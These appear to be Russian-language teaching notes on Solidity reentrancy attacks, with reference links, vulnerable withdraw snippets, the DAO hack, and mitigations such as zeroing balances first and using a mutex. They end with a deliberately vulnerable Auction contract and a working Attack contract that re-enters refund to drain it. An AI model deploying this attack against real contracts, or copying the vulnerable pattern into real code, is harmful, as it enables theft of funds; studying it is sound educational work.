https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21
https://blog.sigmaprime.io/solidity-security.html#reentrancy
https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/
https://github.com/kadenzipfel/smart-contract-attack-vectors/blob/master/attacks/reentrancy.md


// в следующем видео подробно разобрать взлом DAO

https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/

https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol

Reentrancy - атака повторного входа. Становится возможной когда в контракте реальизована функция вывода Eth на произвольный адрес
с помощью вызова call

Почему именно call а не transfer. В функции transfer есть ограничение по gas. Так что транзакция завершится с ошибкой при превышении установленного значения
в 2300 

Типы повторных атак:

- однофункциональная

function withdraw() external {
 uint256 amount = balances[msg.sender];
 require(msg.sender.call.value(amount)());
 balances[msg.sender] = 0;
}

- многофункциональная

function transfer(address to, uint amount) external {
 if (balances[msg.sender] >= amount) {
 balances[to] += amount;
 balances[msg.sender] -= amount;
 }
}
function withdraw() external {
 uint256 amount = balances[msg.sender];
 require(msg.sender.call.value(amount)());
 balances[msg.sender] = 0;
}

Взлом DAO был одной из самых громких повторных атак в истории Ethereum. Злоумышленнику удалось слить около 3,6 миллионов эфиров, 50 млн дол.
В 2016 году

Меры предосторожности:

1. использовать transfer функции считаются более безопасными, поскольку они ограничены 2300 gas. 
Ограничение газа предотвращает обратный вызов дорогостоящей внешней функции к целевому контракту. 
Одна ошибка заключается в том, что в контракте устанавливается пользовательское количество газа для отправки или передачи 
msg.sender.call(ethAmount).gas(gasAmount).

2. занулять баланс до того как происходит списание

3. использовать Мьютекс например у open zeppelin


// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Auction is Ownable {
    uint constant minBID = 0.01 ether;
    mapping(address => uint) private bidders;

    function bid() external payable {
        require(msg.value >= minBID, "Bid is very small!");
        bidders[msg.sender] += msg.value;
    }

    function getBalance() public view returns(uint balance) {
        balance = address(this).balance;
    }

    function refund() external {
        require(bidders[msg.sender] > minBID, "You have not bid!");
        (bool success,) = (msg.sender).call{value: bidders[msg.sender]}("");
        require(success, "Faild!");
        bidders[msg.sender] = 0;
    }

    function withdraw() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}

contract Attack is Ownable {
    uint constant minBID = 0.01 ether;
    Auction private _auction;

    constructor(address auction_) {
        _auction = Auction(auction_);
    }

    function doBid() external payable {
        _auction.bid{value: minBID}();
    }

    function attack() external {
        _auction.refund();
    }

    receive() external payable {
        if(_auction.getBalance() >= minBID) {
            _auction.refund();
        }
    }

    function withdraw() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}